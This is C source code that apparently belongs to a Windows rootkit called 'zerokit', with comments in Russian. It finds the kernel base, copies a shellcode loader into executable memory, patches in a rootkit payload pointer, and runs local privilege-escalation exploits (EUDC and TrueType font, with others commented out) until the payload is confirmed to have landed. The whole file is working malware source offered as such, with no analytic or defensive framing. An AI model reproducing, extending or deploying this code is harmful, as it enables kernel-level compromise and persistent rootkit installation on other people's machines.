#ifdef USE_EXPLOITS

#include "..\..\..\loader\mod_shared\zerokit.h"

NTSTATUS ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, pvoid_t SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

BOOLEAN exploit_check_temp_file(wchar_t* path)
{
    wchar_t* pFname;
    WIN32_FIND_DATAW ffd;
    HANDLE hFind;
    int ret = 0, counter = 0;

    pFname = path + fn_lstrlenW(path);
    for ( ; pFname >= path && *pFname != '\\'; --pFname);
    ++pFname;

    do {
        fn_Sleep(700); // Ожидаем одну секунду.

        hFind = fn_FindFirstFileW(path, &ffd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                /// to do check file
                if (fn_lstrcmpiW(pFname, ffd.cFileName) == 0) {
                    ret = 1;
                    break;
                }
            } while (fn_FindNextFileW(hFind, &ffd));

            fn_FindClose(hFind);
        }
    } while (++counter < 3 && ret != 1);

    return ret;
}

typedef NTSTATUS (*FnKeDelayExecutionThread)( int  WaitMode, BOOLEAN  Alertable, PLARGE_INTEGER  Interval );
// typedef PVOID (*FnExAllocatePoolWithTag)( int  PoolType,  SIZE_T  NumberOfBytes,  ULONG  Tag  );
// typedef PVOID (__cdecl *Fnkern_memcpy)(void *dest, void *src, size_t count );
// typedef LONG (*FnEntryPoint)(PVOID modBase, PVOID ptr);

HMODULE hKernel;
uint8_t* kernelBase;
FnKeDelayExecutionThread fnKeDelayExecutionThread;

// uint8_t* halBase;
// ULONG_PTR pHalDispatchTable;


FARPROC exploit_get_kernel_address(uint8_t* userKernBase, uint8_t* realKernelBase, const char* symName)
{
    uint8_t* temp = (uint8_t*)PeGetProcAddress(userKernBase, symName, FALSE);

    if (temp == NULL) {
        return NULL;
    }

    return (FARPROC)(temp - userKernBase + realKernelBase);
}

bool_t exploit_obtain_kernel_info() 
{
//     char kFullName[256];
    PSYSTEM_MODULE_INFORMATION pModuleInfo = NULL;
//      ULONG i;
     ULONG len = 0;
//     uint32_t knLen;

    if (globalData.gSysInfo.isWow64) {
        return TRUE;
    }

//     __stosb((uint8_t*)kFullName, 0, sizeof(kFullName));

    fn_ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

    pModuleInfo = (PSYSTEM_MODULE_INFORMATION)fn_VirtualAlloc(0, len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (fn_ZwQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len) != STATUS_SUCCESS) {
        DbgMsg(__FUNCDNAME__": ZwQuerySystemInformation failed\n");
        return FALSE;
    }

    kernelBase = (uint8_t*)pModuleInfo->Modules[0].Base;
//     knLen = lstrlenA(pModuleInfo->Modules[0].ImageName);
//     __movsb((uint8_t*)kFullName, (uint8_t*)pModuleInfo->Modules[0].ImageName, knLen);
// 
//     for (i = 0; i < pModuleInfo->ModulesCount; ++i) {
//         if (util_strstr(pModuleInfo->Modules[i].ImageName, "hal.dll") != -1) {
//             halBase = (uint8_t*)pModuleInfo->Modules[i].Base;
//             break;
//         }
//     }

    hKernel = fn_LoadLibraryExA(pModuleInfo->Modules[0].ImageName + pModuleInfo->Modules[0].ModuleNameOffset, NULL, DONT_RESOLVE_DLL_REFERENCES);

    fn_VirtualFree(pModuleInfo, len, MEM_RELEASE | MEM_DECOMMIT);

    if (hKernel == NULL) {
        DbgMsg(__FUNCDNAME__": LoadLibraryExA failed %d\n", fn_GetLastError());
        return FALSE;
    }

    fnKeDelayExecutionThread = (FnKeDelayExecutionThread)exploit_get_kernel_address((uint8_t*)hKernel, kernelBase, "KeDelayExecutionThread");
// //     pHalDispatchTable = (ULONG_PTR)exploit_get_kernel_address((uint8_t*)hKernel, kernelBase, "HalDispatchTable");
// 
    return (fnKeDelayExecutionThread != NULL/* && pHalDispatchTable != 0*/);
}

#include "zk_loader_x32.c"
#include "zk_loader_x64.c"

#ifdef _WIN64
//#include "exploits/exploit_sysret.c"
#else
#include "exploits\exploit_eudc.c"
// #include "exploits\exploit_afd.c"
#include "exploits\exploit_ttf.c"
#endif // _WIN64

// Прототип функции, сигнатуре которой должна соотвествовать каждая эксплоитная функция.
typedef int (__stdcall *FnExploitFire)();

#ifdef _WIN64
#define NUM_EXPLOITS 0  // Количество эксплоитов.
#else
#define NUM_EXPLOITS 2  // Количество эксплоитов.
#endif // W_IN64

BOOLEAN exploit_fire()
{
    int ret = 0;
    uint8_t* pSc;
    uint32_t scSize;
    wchar_t tempPath[MAX_PATH];
    uint32_t i;
#ifdef _WIN64
    //FnExploitFire exploits[NUM_EXPLOITS] = {exploit_fire_sysret};
#else
    FnExploitFire exploits[NUM_EXPLOITS] = {exploit_fire_eudc, exploit_fire_ttf};
#endif // _WIN64

    utils_get_temp_name(tempPath, sizeof(tempPath));

    fn_lstrcpyW(globalData.g_tmpPath, L"\\??\\");
    fn_lstrcatW(globalData.g_tmpPath, tempPath);

    DbgMsg(__FUNCDNAME__": Rootkit temp file: %S\n", globalData.g_tmpPath);

    __movsb(globalData.gPayload, globalData.g_tmpPath, sizeof(exploit_startup_header_t));

#ifndef _WIN64
    if (!exploit_obtain_kernel_info()) {
        DbgMsg(__FUNCDNAME__": exploit_obtain_kernel_info failed\n");
        return ret;
    }
#endif // _WIN64

#ifdef _WIN64
//     pSc = zk_loader_x64;
//     scSize = sizeof(zk_loader_x64);
#else
    if (globalData.sysInfo.isWow64) {
        pSc = zk_loader_x64;
        scSize = sizeof(zk_loader_x64);
    }
    else {
        pSc = zk_loader_x32;
        scSize = sizeof(zk_loader_x32);
    }
#endif 

    globalData.gLevel1Shellcode = (uint8_t*)fn_VirtualAlloc(NULL, scSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    __movsb(globalData.gLevel1Shellcode, pSc, scSize);

#ifndef _WIN64
    if (globalData.gSysInfo.isWow64) {
        utils_fix_64value(globalData.gLevel1Shellcode, scSize, 0xAAAAAAAAAAAAAAAAULL, (uint64_t)globalData.gPayload);
    }
    else {
        utils_fix_32value(globalData.gLevel1Shellcode, scSize, 0xAAAAAAAA, (uint32_t)globalData.gPayload);
    }
#endif // _WIN64

    for (i = 0; i < NUM_EXPLOITS; ++i) {
        if ((ret = exploits[i]())) {
            if (exploit_check_temp_file(tempPath)) {
                break;
            }
            else {
                ret = 0;
            }
        }
    }
    //fn_VirtualFree(pSc, 0, MEM_DECOMMIT | MEM_RELEASE);

    return ret;
}

#endif // USE_EXPLOITS
